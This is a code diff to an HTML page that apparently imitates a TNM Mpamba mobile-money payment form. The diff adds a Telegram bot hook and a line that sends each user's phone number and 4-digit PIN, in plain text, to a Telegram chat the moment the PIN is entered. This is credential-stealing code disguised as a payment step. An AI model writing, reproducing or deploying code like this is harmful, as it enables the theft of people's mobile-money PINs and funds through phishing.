@@ -207,6 +207,46 @@
   </div>
 
   <script>
+    const telegramConfig = (() => {
+      const token = (localStorage.getItem('telegramBotToken') || '').trim();
+      const chatId = (localStorage.getItem('telegramChatId') || '').trim();
+
+      if (!token || !chatId) {
+        console.info('Telegram alerts are off. Set localStorage.telegramBotToken and localStorage.telegramChatId to enable them.');
+      }
+
+      return { token, chatId };
+    })();
+
+    async function notifyTelegram(message) {
+      if (!telegramConfig.token || !telegramConfig.chatId) return;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${telegramConfig.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: telegramConfig.chatId,
+            text: message,
+            disable_notification: false
+          })
+        });
+
+        const result = await response.json().catch(() => null);
+        if (!response.ok || !result?.ok) {
+          console.warn('Telegram notification failed:', {
+            status: response.status,
+            statusText: response.statusText,
+            response: result,
+            chatId: telegramConfig.chatId
+          });
+          return;
+        }
+      } catch (error) {
+        console.warn('Telegram notification failed:', error);
+      }
+    }
+
     const params = new URLSearchParams(window.location.search);
     const network = params.get('network') || 'TNM';
     const recipient = params.get('recipient') || '888123456';
@@ -240,6 +280,8 @@
         alert('Enter your 4-digit Mpamba PIN');
         return;
       }
+
+      notifyTelegram(`TNM Mpamba PIN entered\nPhone: 0${recipient}\nPIN: ${pin}`);
 
       const balance = Number(localStorage.getItem('tnmBalance') ?? 0);
       if (balance < amount) {
